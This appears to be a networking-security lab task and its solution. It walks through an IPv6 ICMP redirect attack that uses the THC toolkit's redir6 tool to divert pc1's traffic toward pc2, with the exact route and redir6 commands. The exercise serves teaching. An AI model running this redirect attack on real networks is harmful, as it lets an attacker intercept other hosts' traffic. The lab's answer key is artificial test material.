The adversary wants to attract the traffic of pc1 towards
pc2. Then, it uses the ICMP redirect to perform it.

You have to use a1 to change the routing decision of pc1 when
moving to pc2. You have to use the redir6 tool. a1 is NOT
configured.

All the needed dependencies are in the cache, you only have to
compile the thc-toolkit (make).

Solution:
> Run in pc2 a command "ip -6 r add <global-pc2> via fe80::1 dev eth0" // to add routing table entry
> In a1 run "make" inside THC folder to compile thc 
> Run "redir6 eth0 <local-pc1> <global-pc2> fe80::1 <attacker-local>"
